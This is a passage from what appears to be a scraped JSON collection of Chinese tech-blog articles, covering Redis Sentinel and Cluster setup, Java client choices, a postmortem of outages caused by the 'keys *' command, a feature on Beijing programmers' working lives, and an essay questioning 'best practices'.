Sentinel,\n,Redis Sentinel是Redis官方开发的监控组件，可以监控Redis实例的状态，通过Master节点自动发现Slave节点，并在监测到Master节点失效时选举出一个新的Master，并向所有Redis实例推送新的主从配置。,\n,Redis Sentinel需要至少部署3个实例才能形成选举关系。,\n,关键配置：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsentinel monitor mymaster 127.0.0.1 6379 2  #Master实例的IP、端口，以及选举需要的赞成票数\r\nsentinel down-after-milliseconds mymaster 60000  #多长时间没有响应视为Master失效\r\nsentinel failover-timeout mymaster 180000  #两次failover尝试间的间隔时长\r\nsentinel parallel-syncs mymaster 1  #如果有多个Slave，可以通过此配置指定同时从新Master进行数据同步的Slave数，避免所有Slave同时进行数据同步导致查询服务也不可用\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sentinel ,monitor ,mymaster, ,127.0.0.1, ,6379, ,2,  ,#Master实例的IP、端口，以及选举需要的赞成票数,sentinel ,down,-,after,-,milliseconds ,mymaster, ,60000,  ,#多长时间没有响应视为Master失效,sentinel ,failover,-,timeout ,mymaster, ,180000,  ,#两次failover尝试间的间隔时长,sentinel ,parallel,-,syncs ,mymaster, ,1,  ,#如果有多个Slave，可以通过此配置指定同时从新Master进行数据同步的Slave数，避免所有Slave同时进行数据同步导致查询服务也不可用, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,另外需要注意的是，Redis Sentinel实现的自动failover不是在同一个IP和端口上完成的，也就是说自动failover产生的新Master提供服务的IP和端口与之前的Master是不一样的，所以要实现HA，还要求客户端必须支持Sentinel，能够与Sentinel交互获得新Master的信息才行。,\n,集群分片,\n,为何要做集群分片：,\n,\n,Redis中存储的数据量大，一台主机的物理内存已经无法容纳,\n,Redis的写请求并发量大，一个Redis实例以无法承载,\n,\n,当上述两个问题出现时，就必须要对Redis进行分片了。,\nRedis的分片方案有很多种，例如很多Redis的客户端都自行实现了分片功能，也有向Twemproxy这样的以代理方式实现的Redis分片方案。然而首选的方案还应该是Redis官方在3.0版本中推出的Redis Cluster分片方案。,\n,本文不会对Redis Cluster的具体安装和部署细节进行介绍，重点介绍Redis Cluster带来的好处与弊端。,\n,Redis Cluster的能力,\n,\n,能够自动将数据分散在多个节点上,\n,当访问的key不在当前分片上时，能够自动将请求转发至正确的分片,\n,当集群中部分节点失效时仍能提供服务,\n,\n,其中第三点是基于主从复制来实现的，Redis Cluster的每个数据分片都采用了主从复制的结构，原理和前文所述的主从复制完全一致，唯一的区别是省去了Redis Sentinel这一额外的组件，由Redis Cluster负责进行一个分片内部的节点监控和自动failover。,\n,Redis Cluster分片原理,\n,Redis Cluster中共有16384个hash slot，Redis会计算每个key的CRC16，将结果与16384取模，来决定该key存储在哪一个hash slot中，同时需要指定Redis Cluster中每个数据分片负责的Slot数。Slot的分配在任何时间点都可以进行重新分配。,\n,客户端在对key进行读写操作时，可以连接Cluster中的任意一个分片，如果操作的key不在此分片负责的Slot范围内，Redis Cluster会自动将请求重定向到正确的分片上。,\n,hash tags,\n,在基础的分片原则上，Redis还支持hash tags功能，以hash tags要求的格式明明的key，将会确保进入同一个Slot中。例如：{uiv}user:1000和{uiv}user:1001拥有同样的hash tag {uiv}，会保存在同一个Slot中。,\n,使用Redis Cluster时，pipelining、事务和LUA Script功能涉及的key必须在同一个数据分片上，否则将会返回错误。如要在Redis Cluster中使用上述功能，就必须通过hash tags来确保一个pipeline或一个事务中操作的所有key都位于同一个Slot中。,\n,有一些客户端（如Redisson）实现了集群化的pipelining操作，可以自动将一个pipeline里的命令按key所在的分片进行分组，分别发到不同的分片上执行。但是Redis不支持跨分片的事务，事务和LUA Script还是必须遵循所有key在一个分片上的规则要求。,\n,主从复制 vs 集群分片,\n,在设计软件架构时，要如何在主从复制和集群分片两种部署方案中取舍呢？,\n,从各个方面看，Redis Cluster都是优于主从复制的方案,\n,\n,Redis Cluster能够解决单节点上数据量过大的问题,\n,Redis Cluster能够解决单节点访问压力过大的问题,\n,Redis Cluster包含了主从复制的能力,\n,\n,那是不是代表Redis Cluster永远是优于主从复制的选择呢？,\n,并不是。,\n,软件架构永远不是越复杂越好，复杂的架构在带来显著好处的同时，一定也会带来相应的弊端。采用Redis Cluster的弊端包括：,\n,\n,维护难度增加。在使用Redis Cluster时，需要维护的Redis实例数倍增，需要监控的主机数量也相应增加，数据备份/持久化的复杂度也会增加。同时在进行分片的增减操作时，还需要进行reshard操作，远比主从模式下增加一个Slave的复杂度要高。,\n,客户端资源消耗增加。当客户端使用连接池时，需要为每一个数据分片维护一个连接池，客户端同时需要保持的连接数成倍增多，加大了客户端本身和操作系统资源的消耗。,\n,性能优化难度增加。你可能需要在多个分片上查看Slow Log和,Swap,日志才能定位性能问题。,\n,事务和LUA Script的使用成本增加。在Redis Cluster中使用事务和LUA Script特性有严格的限制条件，事务和Script中操作的key必须位于同一个分片上，这就使得在开发时必须对相应场景下涉及的key进行额外的规划和规范要求。如果应用的场景中大量涉及事务和Script的使用，如何在保证这两个功能的正常运作前提下把数据平均分到多个数据分片中就会成为难点。,\n,\n,所以说，在主从复制和集群分片两个方案中做出选择时，应该从应用软件的功能特性、数据和访问量级、未来发展规划等方面综合考虑，只在,确实有必要,引入数据分片时再使用Redis Cluster。,\n下面是一些建议：,\n,\n,需要在Redis中存储的数据有多大？未来2年内可能发展为多大？这些数据是否都需要长期保存？是否可以使用LRU算法进行非热点数据的淘汰？综合考虑前面几个因素，评估出Redis需要使用的物理内存。,\n,用于部署Redis的主机物理内存有多大？有多少可以分配给Redis使用？对比(1)中的内存需求评估，是否足够用？,\n,Redis面临的并发写压力会有多大？在不使用pipelining时，Redis的写性能可以超过10万次/秒（更多的benchmark可以参考 ,https://redis.io/topics/benchmarks, ）,\n,在使用Redis时，是否会使用到pipelining和事务功能？使用的场景多不多？,\n,\n,综合上面几点考虑，如果单台主机的可用物理内存完全足以支撑对Redis的容量需求，且Redis面临的并发写压力距离Benchmark值还尚有距离，建议采用主从复制的架构，可以省去很多不必要的麻烦。同时，如果应用中大量使用pipelining和事务，也建议尽可能选择主从复制架构，可以减少设计和开发时的复杂度。,\n,Redis Java客户端的选择,\n,Redis的Java客户端很多，官方推荐的有三种：Jedis、Redisson和lettuce。,\n,在这里对Jedis和Redisson进行对比介绍,\n,Jedis：,\n,\n,轻量，简洁，便于集成和改造,\n,支持连接池,\n,支持pipelining、事务、LUA Scripting、Redis Sentinel、Redis Cluster,\n,不支持读写分离，需要自己实现,\n,文档差（真的很差，几乎没有……）,\n,\n,Redisson：,\n,\n,基于Netty实现，采用非阻塞IO，性能高,\n,支持异步请求,\n,支持连接池,\n,支持pipelining、LUA Scripting、Redis Sentinel、Redis Cluster,\n,不支持事务，官方建议以LUA Scripting代替事务,\n,支持在Redis Cluster架构下使用pipelining,\n,支持读写分离，支持读负载均衡，在主从复制和Redis Cluster架构下都可以使用,\n,内建Tomcat Session Manager，为Tomcat 6/7/8提供了会话共享功能,\n,可以与Spring Session集成，实现基于Redis的会话共享,\n,文档较丰富，有中文文档,\n,\n,对于Jedis和Redisson的选择，同样应遵循前述的原理，尽管Jedis比起Redisson有各种各样的不足，但也应该在需要使用Redisson的高级特性时再选用Redisson，避免造成不必要的程序复杂度提升。,\n,Jedis：,\ngithub：,https://github.com/xetorthio/jedis,\n文档：,https://github.com/xetorthio/jedis/wiki,\n,Redisson：,\ngithub：,https://github.com/redisson/redisson,\n文档：,https://github.com/redisson/redisson/wiki,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 4 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114445/", "url_object_id": "55c50c6d3dec21284eb5d9158373da19", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/a3f700ca2ede780d76b0ad474852fa91.jpg"], "title": "走近北京后厂村程序员的真实生活：“拿命换钱”", "create_time": "2018/09/09", "vote": "2", "bookmark": "1", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,中新经纬/赵佳然,   ,北京的西北角是个特别的区域，这里汇集了众多互联网及IT企业，实力雄厚的上市公司将自家logo悬挂在大厦的顶端，而刚起步的创业公司也会选择在这里租下一亩三分地。,\n,中关村、上地、西二旗、后厂村……它们成为了一个个地标，而在这里工作的年轻人，总是第一时间被打上“码农”“程序员”的标签。在大家眼中，他们往往身着格子衬衫，头戴耳机身背双肩包，披星戴月地上下班，每天十几个小时面对着电脑屏幕。,\n,西二旗地铁站,\n,我们习惯把他们看作一个整体，从性格、着装到消费水平都大致定型。然而，他们也许曾在某个地铁站多次擦肩而过，但每个人心中的目标、理想和焦虑，都各不相同。,\n,我把家从三环里搬到了六环外,\n,老田今年28岁，北京生北京长，是个标准的“土著”。10年前的他大概没有想过，自己会来到当时名不见经传的后厂村工作。,\n,2013年夏天，老田本科毕业，专业是当年正吃香的计算机与科学技术。他顺利地找到了一份某大型电信公司的内勤工作，但入职后发现，工作的内容与所学的专业知识并无相关。,\n,“就是天天处理人际关系，没别的。”他回忆道。,\n,不是没有考虑过换行，老田曾经要求过调岗，但却在面试的时候受了挫。“对方本来要问我一个专业问题，后来突然看了看我简历说：‘你是13年毕业的啊，那这个你可能没学过。’后来我就没怎么想着调岗的事了，想看看其他机会吧。”,\n,不过这份工作也有极大的优势：工作量少，离家近。老田每天可以8点起床，溜达15分钟到单位，下午5点半之前到家，琢磨晚上给爱人做点什么吃。老田最大的爱好就是做饭，人生理想是拥有属于自己的饭馆，不过这个目标现在看来还远得很。,\n,今年年初，也是老田结婚的第二年，他们摇号中了一套共有产权房，这意味着两人从无贷一身轻的状态，变成了每个月需还款7000多元。这突然的改变，也让他不得不再次审视自己的收入情况。“必须要多攒点钱了。”他对自己说。,\n,清晨的后厂村路，老田每天的必经之地 受访者供图,\n,经过熟人介绍，他来到了“大名鼎鼎”的后厂村，在一家央企做工程师。还没开始体会到工作的高强度，通勤的问题就先来了：家住在东三环内，公司在北五环外，高峰期堵得严严实实，咋办？,\n,与爱人商量之后，老田决定工作日住到六环外的亲戚家。“往北走高速，开20多分钟就到了，回家直接睡觉。”就这样，从公司到住处，从工作到睡觉的循环开始了。,\n,由于已经4年没上手专业技能，突如其来的高强工作量让他发懵。他坦言，工作以来，这是头回一想到上班就开始焦虑。三个月过去，好不容易熟悉了基本操作，但工作压力依然压得他喘不过气。喝不惯咖啡的他，每天中午和其他同事一样，需要在躺椅上休息近一小时，否则整个下午都会浑浑噩噩。,\n,一日下班后，老田随手抓了抓脑袋，却惊讶地发现掉了满桌的头发。“我觉得这份工作就是在拿命换钱。”他说。,\n,老田办公室的躺椅，同事们几乎人手一个 受访者供图,\n,其实，老田从来没放弃过开饭馆的梦。他自己也明白，目前的积蓄还无法支撑起这个目标，同时后厂村的高强度作业也不是长久之计。“先干两年，等把知识学到手，也算是留了个后路，以后就算创业失败了，也能养家糊口。”眼看“奔三”了，下一代的计划也渐渐提上日程，他便愈发不敢放松对自己的要求。,\n,晚上9点，老田揉了揉发涩的眼睛，发动汽车，开往六环外的住所。高速走得很顺，车里放着《北京土著》，顺便想想周末该做什么新菜。他突然觉得，要是这段路再长一点，也挺好的。,\n,晚上10点，后厂村的办公大楼仍灯火通明,\n,“程序媛”和你们想象得不太一样,\n,小徐在中关村上班，是个程序员，性别女。,\n,她知道女性程序员在大众眼里的模样：要么，就是从不化妆，戴着厚厚的眼镜，穿着上也从不在意，在人群里是最不起眼的存在；要么，就是只顾打扮不顾业务，利用着与生俱来的“性别优势”，自然地索求同事们的帮助。,\n,她认为自己与两者均无相似之处。,\n,在求职时，小徐的同学们或多或少地抱怨过用人单位的不公平待遇，即同样条件下，招收女性程序员的可能性较小。在这份需脑力与体力兼备的工作中，女性似乎确实不占优势，但幸运的是，许多大型公司在招聘时注重性别的均衡，她也未曾遭受异样的审视。“我就职的这家外企比较重视员工的diversity(差异性)，因此团队里的女性不少，很多还是女博士。”她回忆道。,\n,通勤时段，人人都是“低头族”,\n,小徐去年研究生毕业，从香港来到北京求职的她，选择中关村并非为了高薪，而是希望能继续积累知识。“希望我的工作能兼顾我的专业和兴趣，同时能给我不断提升自我的机会。”经过筛选，最终她就职于某外企的研究机构，与云技术、人工智能等尖端科技打交道。,\n,太多年轻人初入职场时也怀着学习的心态，但不久后便与繁忙的节奏和升职加薪的烦恼妥协，开始得过且过。小徐却认为，自己所在团队的氛围起到了带头作用，大家在头脑风暴中不断思考、沉淀的过程，是她在工作中最欣赏的部分。“我不喜欢那种领导让做什么就做什么的节奏，太死板，久而久之脑袋都麻木了。”,\n,虽然目前的工作尽如人意，但小徐还面临着大部分“程序媛”都避不开的问题：来自亲人朋友的无形压力。随着IT圈“赚5万花5千”“过度劳动”“脱发”等吐槽越来越深入人心，身边的人自然会产生担忧：身体状况怎么样？平时有自己的时间吗？非要做这行不可吗？,\n,小徐的钢琴 受访者供图,\n,小徐多次与母亲提及这个话题，但都以她的坚持而结束。但她潜意识里也存在着焦虑。虽然入职只有一年光景，但她已经从周围同事的身上看到了自己可能的未来，并不时怀疑：我可以做到那么优秀吗？,\n,“刚入职的时候抱有热情和冲劲很正常，但眼看着同事和领导资历越高，节奏越快，我也会担心自己以后能否平衡工作和生活，会遇到什么样的瓶颈。总之我不希望工作侵吞我所有的生活，如果有合适机会的话，我或许会考虑跳槽，但目前的职业方向还是不会变的。”小徐说。,\n,然而，尽管有着迷茫和顾虑，但小徐仍坚持着自己对事物的新鲜感。给自己报的成人钢琴班已经小有成效，最近正练习着《小步舞曲》。,\n,她是职场新人，是“程序媛”，也是“北漂”，但最重要的，她是她自己。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 1 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114364/", "url_object_id": "a47d0bf593223db07b3e04d691f43a44", "front_image_path": "full/44c2919ba48fd2a8c45629c53265ad798043813c.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "title": "Redis 的 KEYS 命令引起 RDS 数据库雪崩，宕机 2 次，造成几百万损失", "create_time": "2018/09/22", "vote": "3", "bookmark": "8", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,陈浩翔,   ,最近的互联网线上事故发生比较频繁，,9月19日网上爆料出顺丰近期发生了一起线上删库事件,，在这里就不介绍了。,\n,在这里讲述一下最近发生在我公司的事故，以及如何避免，并且如何处理优化。 该宕机的直接原因是使用 Redis 的 ,keys *, ,命令引起的，一共造成了某个服务化项目的两次宕机。,\n,间接原因还有很多，技术跟不上业务的发展，由每日百万量到千万级是一个大的跨进，公司对于系统优化的处理优先级不高，技术开发人手的短缺。,\n,第一次宕机,\n,2018年9月13日的某个点，公司某服务化项目的 RDS 实例连接飙升，CPU 升到 100%，拒绝了其他应用的所有请求服务。,\n,整个过程如下：,\n,\n,监控报警，显示RDS的CPU使用率达到80%以上，DBA介入，准备KILL慢SQL,\n,1分钟内，没有发现明显阻塞的SQL，CPU持续上升到99%,\n,5分钟内，大量应用报警，并且拒绝服务，RDS的监控显示出现大量慢SQL，联系服务器数据库提供商进行协助,\n,8分钟内，进行数据库主备切换（业务会受损，但是也没办法，没有定位到问题）,\n,9分钟内，部分业务恢复，但是一些业务订单的回调消息堆积超过20w，备库的CPU使用率也持续上升,\n,15分钟内，备库CPU使用率超过97%，业务再次中断，进行切回主库，并进行限流,\n,20分钟内，关闭一些次要应用的流量入口,\n,25分钟内，主库CPU使用率恢复正常,\n,30分钟内，逐步开启关闭的限流应用,\n,35分钟内，所有应用恢复正常,\n,接下来就是与服务器数据库提供商成立应急小组紧急优化可能出现的慢SQL，虽然说可能解决了一些慢SQL，但此次并没有定位到具体的问题，也就为几天后再次发生宕机事件埋下了伏笔,\n,\n,事故影响,\n,某服务化项目服务不可用几十分钟，造成订单数减少几十万笔，损失百万资金。,\n,原因分析,\n,当时是没有定位到具体的原因的，但是下面的原因也是一部分可能引起宕机的情况。,\n,某服务化项目的业务增速非常快，在高峰期，数据库QPS突破35000，系统处于高负荷状态。,\n,在高峰期如果同时执行几个全表扫描的SQL，会造成数据库压力急剧上升，应用超时增多，前端应用超时，用户重试，流量飙升，形成了雪崩效应。,\n,主要原因在与一些老项目的SQL查询性能较差，并且使用的主库，对数据库影响较大。数据库QPS太高，但是缓存方案因为人手原因一直没有落地，慢SQL的问题处理优先级应该提升。,\n,改进方案,\n,\n,针对每个应用建一个数据库账号，严格按照规范使用,\n,缓存优化方案即时落地，慢SQL问题优先处理，集中处理目前已经发现的慢SQL（查询时间超过1S）,\n,升级数据库配置,\n,迁移非核心业务到新的RDS实例中去,\n,\n,第二次宕机,\n,由于上一次的宕机原因未找到，所以此次的宕机是可以预见的。,\n,20180919，还是一样的”配方”，还是原来的”味道”。同一个RDS，CPU飙升至100%，接下来就是拒绝服务，宕机。当然，有了第一次的经验，直接主从切换，在几十秒左右就恢复了所有业务，但还是严重影响了公司的业务和形象,\n,原因分析,\n,恢复业务后，公司紧急召开了紧急事故研究会议，当然，我的级别是参与不了的。公司的高管，高层技术架构、DBA、各个项目的主负责人一起进行了会议。,\n,在此次会议中，经过查看各个项目的日志，后台的监控数据，发现在那台RDS数据库CPU飙升时，有一台Redis数据库内存将近100%，然后急剧下降。联系第一次的宕机情况，也是类似的。,\n,接下来就是联系服务器数据库提供商，将那台Redis最近一周的命令全部调用出来，最后发现，在那个时间点运行了一条,keys *...*,命令。公司的一个工程师执行keys模糊的匹配命令是为了清理没用的键，但是没有考虑到,keys *,进行模糊匹配引发Redis锁，造成Redis锁住，CPU飙升，引起了所有调用链路的超时并且卡住，等Redis锁的那几秒结束，所有的请求流量全部请求到RDS数据库中，使数据库产生了雪崩，使数据库宕机。,\n,改进方案,\n,\n,所有线上操作，全部要经过运维通过后方可执行，运维部门逐步快速收回各项权限,\n,新增Redis实例，进行分离,\n,如果有使用类似keys正则命令需求，使用scan命令代替,\n,\n,总结,\n,该事件中出现的两次事故，完全是由于人为操作引起的，如果那位工程师，看过Redis的开发规范，会发现是建议禁用keys命令的。另外，有线上的命令操作，一定要经过运维评估后方可进行操作，估计那个工程师是老员工吧，有权限，然后直接就进行操作了。,\n,另外，公司的业务发展确实很快，技术跟不上，这是非常非常危险的，极大的增加了宕机的概率。,\n,在业务量不大的情况下，那位工程师的操作是完全没什么问题的，毕竟并发也不大，但是现在，随着公司的发展，业务量的成倍成倍增加，技术的扩展却没有随着增长那么快。,\n,公司的技术人手不足也是一方面，绝大多数人都是边维护老项目边做新功能，但是对于项目的重构优化，人手却少了很多，项目优化的优先级不高，这也是很大的一个原因，极有可能出现类似的情况，新服务化构建迫在眉睫。,\n,最后的最后，线上操作的任何一条命令，再小心也不为过。,\n,因为由于你的一个符号而引起的事故可能是你所承担不起的,\n,Redis开发建议,\n,最后附上Redis的一些开发规范和建议：,\n,1.冷热数据分离，不要将所有数据全部都放到Redis中,\n,虽然Redis支持持久化，但是Redis的数据存储全部都是在内存中的，成本昂贵。建议根据业务只将高频热数据存储到Redis中【QPS大于5000】，对于低频冷数据可以使用MySQL/ElasticSearch/MongoDB等基于磁盘的存储方式，不仅节省内存成本，而且数据量小在操作时速度更快、效率更高！,\n,2.不同的业务数据要分开存储,\n,不要将不相关的业务数据都放到一个Redis实例中，建议新业务申请新的单独实例。因为Redis为单线程处理，独立存储会减少不同业务相互操作的影响，提高请求响应速度；同时也避免单个实例内存数据量膨胀过大，在出现异常情况时可以更快恢复服务！ 在实际的使用过程中，redis最大的瓶颈一般是CPU，由于它是单线程作业所以很容易跑满一个逻辑CPU，可以使用redis代理或者是分布式方案来提升redis的CPU使用率。,\n,3.存储的Key一定要设置超时时间,\n,如果应用将Redis定位为缓存Cache使用，对于存放的Key一定要设置超时时间！因为若不设置，这些Key会一直占用内存不释放，造成极大的浪费，而且随着时间的推移会导致内存占用越来越大，直到达到服务器内存上限！另外Key的超时长短要根据业务综合评估，而不是越长越好！,\n,4.对于必须要存储的大文本数据一定要压缩后存储,\n,对于大文本【+超过500字节】写入到Redis时，一定要压缩后存储！大文本数据存入Redis，除了带来极大的内存占用外，在访问量高时，很容易就会将网卡流量占满，进而造成整个服务器上的所有服务不可用，并引发雪崩效应，造成各个系统瘫痪！,\n,5.线上Redis禁止使用Keys正则匹配操作,\n,Redis是单线程处理，在线上KEY数量较多时，操作效率极低【时间复杂度为O(N)】，该命令一旦执行会严重阻塞线上其它命令的正常请求，而且在高QPS情况下会直接造成Redis服务崩溃！如果有类似需求，请使用scan命令代替！,\n,6.可靠的消息队列服务,\n,Redis List经常被用于消息队列服务。假设消费者程序在从队列中取出消息后立刻崩溃，但由于该消息已经被取出且没有被正常处理，那么可以认为该消息已经丢失，由此可能会导致业务数据丢失，或业务状态不一致等现象发生。,\n,为了避免这种情况，Redis提供了RPOPLPUSH命令，消费者程序会原子性的从主消息队列中取出消息并将其插入到备份队列中，直到消费者程序完成正常的处理逻辑后再将该消息从备份队列中删除。同时还可以提供一个守护进程，当发现备份队列中的消息过期时，可以重新将其再放回到主消息队列中，以便其它的消费者程序继续处理。,\n,7.谨慎全量操作Hash、Set等集合结构,\n,在使用HASH结构存储对象属性时，开始只有有限的十几个field，往往使用HGETALL获取所有成员，效率也很高，但是随着业务发展，会将field扩张到上百个甚至几百个，此时还使用HGETALL会出现效率急剧下降、网卡频繁打满等问题【时间复杂度O(N)】,此时建议根据业务拆分为多个Hash结构；或者如果大部分都是获取所有属性的操作,可以将所有属性序列化为一个STRING类型存储！同样在使用SMEMBERS操作SET结构类型时也是相同的情况！,\n,8.根据业务场景合理使用不同的数据结构类型,\n,目前Redis支持的数据库结构类型较多：字符串（String），哈希（Hash），列表（List），集合（Set），有序集合（Sorted Set）, Bitmap, HyperLogLog和地理空间索引（geospatial）等,需要根据业务场景选择合适的类型。,\n,常见的如：String可以用作普通的K-V、计数类；Hash可以用作对象如商品、经纪人等，包含较多属性的信息；List可以用作消息队列、粉丝/关注列表等；Set可以用于推荐；Sorted Set可以用于排行榜等！,\n,9.命名规范,\n,虽然说Redis支持多个数据库（默认32个，可以配置更多），但是除了默认的0号库以外，其它的都需要通过一个额外请求才能使用。所以用前缀作为命名空间可能会更明智一点。,\n,另外，在使用前缀作为命名空间区隔不同key的时候，最好在程序中使用全局配置来实现，直接在代码里写前缀的做法要严格避免，这样可维护性实在太差了。,\n,如：系统名:业务名:业务数据:其他,\n,但是注意，key的名称不要过长，尽量清晰明了，容易理解，需要自己衡量,\n,10.线上禁止使用monitor命令,\n,禁止生产环境使用monitor命令，monitor命令在高并发条件下，会存在内存暴增和影响Redis性能的隐患,\n,11.禁止大string,\n,核心集群禁用1mb的string大key(虽然redis支持512MB大小的string)，如果1mb的key每秒重复写入10次，就会导致写入网络IO达10MB;,\n,12.redis容量,\n,单实例的内存大小不建议过大，建议在10~20GB以内。,\n,redis实例包含的键个数建议控制在1kw内，单实例键个数过大，可能导致过期键的回收不及时。,\n,13 可靠性,\n,需要定时监控redis的健康情况：使用各种redis健康监控工具，实在不行可以定时返回redis 的 info信息。,\n,客户端连接尽量使用连接池（长链接和自动重连）,\n\r\n        \r\n        \r\n        \n    ,\n        , ,3, 赞,\n        , 8 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114397/", "url_object_id": "d12fa1e36b9bb9e22ec18c274ee0be47", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/08/aac3e1c638967b5812c7816b91669d20.jpg"], "title": "彼之蜜糖，吾之砒霜 —— 聊聊软件开发中的最佳实践", "create_time": "2018/09/09", "vote": "1", "bookmark": "2", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,sherrywasp,   ,\n, ,\n,“描述一个事物，唯有一个名词定义它的概念，唯有一个动词揭露它的行为，唯有一个形容词表现它的特征。要做的，就是用心去寻找那个名词、那个动词、那个形容词……”,\n,—— 福楼拜 (Gustave Flaubert),\n,我想讲个故事。,\n,很久很久以前（一般讲故事都是这样开头吧）， 两个老工程师在一起聊天，谈各自生涯中最自豪的工程。其中一个先讲述了他的杰作：,\n,“ 我们建造的桥，横跨一个峡谷，峡谷很宽很深。我们花了两年时间研究地质，选择材料。聘请了最好的工程师团队来设计方案，而这又花了五年时间。 我们签下了最大的工程队，委托他们建造基础结构、塔墩、收费亭，以及用于连接桥梁和高速公路的道路。桥面下层是铁路，我们甚至还修了自行车道。 那座桥花费了我数年的心血。”,\n,另外一个听完之后，陷入了沉思，过了一会儿，说到：,\n,“ 有一天晚上，我和一个朋友喝了点伏特加，然后我俩扔了一根绳子，越过一个河谷。呃…… 就是一根绳子，两头系在两颗树上。 河谷两边各有一个村庄，起初，有人加了个滑轮，用来传递包裹。然后，有人拉起了第二根绳子，勉强可以走走，虽然很危险，但小伙子们很喜欢。 后来，一群人重新修建了一下，使得更牢固。于是，女人们也开始从上面走，每天带着她们的农产品过桥。 就这样，在桥的另一边形成了一个市场。因为地方开阔，造了很多房子，慢慢地发展成了一个镇子。 绳索桥被木桥替代，这样就可以走马车了。 后来，镇上的人们修了一座真正的石桥。再然后，人们又把石料改成了钢材。 如今，那座钢构悬索桥依然伫立在那里。”,\n,前一个工程师沉默良久，说到：“ 有意思。我那座桥建成大约十年后，被拆除了。事实证明我们选错了地点，建好的桥没人用。据说有几个野路子的家伙，在下游几英里处，拉了一根绳子，所有人都从那走。”,\n,\n,金门大桥（旧金山）,\n,我很喜欢这个故事。故事的出处，在一款消息队列产品—— ZeroMQ 的,官方指南第6章,里。,\n,说完故事，我想聊聊软件开发中，常常可以听到的一个概念 —— ,Best Practice, ：,最佳实践,。Wikipedia 上对其解释为：,\n,A best practice is a method or technique that has been generally accepted as superior to any alternatives because it produces results that are superior to those achieved by other means or because it has become a standard way of doing things.,\n,(最佳实践是一种：因其产生的结果优于其它选择下的结果，或其已经成为一种做事的标准，从而被普遍认可优于任何替代方案的方法或技术。),\n,这个概念源于管理学，然后在 IT 界泛滥。简而言之，就是所谓“正确的做法”。,\n,最佳实践本身是美好的存在，犹如夜空中的一轮明月，照亮黑暗中的方向，指引着摸索前行的凡人。,\n,但凡事有度，子曰：“过犹不及。”,\n,我今天想说的，就是这,月亮的背面,。（传说中，月球背面隐藏着…… 嘘~）,\n,\n,潮汐锁定导致月球永远以同一面朝向地球,\n,首先，,最佳实践容易带来思想包袱，让人无法专注于解决问题本身。,\n,总是希望采用最好的技术方法，不愿意在不正确的做法上浪费时间，导致瞻前顾后，甚至裹足不前。此时的最佳实践，已然成为了一种毒药，一旦偏离了问题本身这个出发点，就会不知不觉走进“宏大构想”的思维陷阱。把简单的问题复杂化，阻碍了迈出第一步，直到能规划出“包罗万象”的解决方案后才肯动手，拖延症就这样来了，时间却走了。,\n,你想好了未来每一天怎么过吗…… 没想好？ 那……不活了？,\n,其次，,对最佳实践的执念容易让人钻牛角尖，将目标的重心带偏。,\n,过度关注实施过程是否符合标准化，忽视了项目中其它重要的东西，比如用户体验，比如实际需求。就像故事里讲的那样：第一座大桥，几乎是教科书般的标准化路数，可产品落地后和客户需求却差了好几英里；第二个看上去很野路子，但精准地解决了痛点，从始自终都是紧紧围绕实际需求迭代，每一次的进步都可以产生效用，这才叫杀手级应用。,\n,这让我想起了 ,Plan-9, 的传说。,\n,你听说过 Plan-9 OS 吗？ 一款由贝尔实验室的极客们打造的用于完善 UNIX 不足的操作系统。什么不足？在 UNIX 的哲学中，有一条叫做 “一切皆文件” ，但实际上UNIX本身并没有严格遵从这一条。于是，Plan-9 OS 完美实现了这一点。然后呢……？ 没有然后了。它从没进过市场，所以如果你没听说过它，一点也不奇怪。Plan-9 OS 没有解决任何现实问题，没人在乎 “一切皆不皆文件”。,\n,这种执念的另一种表现就是,工程师思维，沉迷于奇技淫巧中无法自拔，,程序员尤其容易中招。,\n,比如性能优化。“优秀的程序员应该榨干每一字节内存”，听起来很熟悉，不是吗？但经济学上来讲，边际效应决定了一次项目中，越优化性价比越低。有一个很容易被忽略的事实：,硬件其实比程序员要便宜,。,\n,再比如对设计模式的崇拜。设计模式当然是好东西，但如果像强迫症一样使用它们，坚持用上它们才是正确的编程，就会导致按图索骥，强行让问题去适应设计模式，而不是让解决方案针对问题，这就本末倒置了。,\n,我有个基友，C++ 极客。毕业后入了腾讯，积累了巨额财富后，自己创业了。当然，当老板可比写 C++ 难多了，于是现在又去积累巨额财富了。想当年和那厮聊天，言必出设计模式，没事侃正则，再没事就研究 GC 策略 (好像玩 C++ 的普遍这德性) 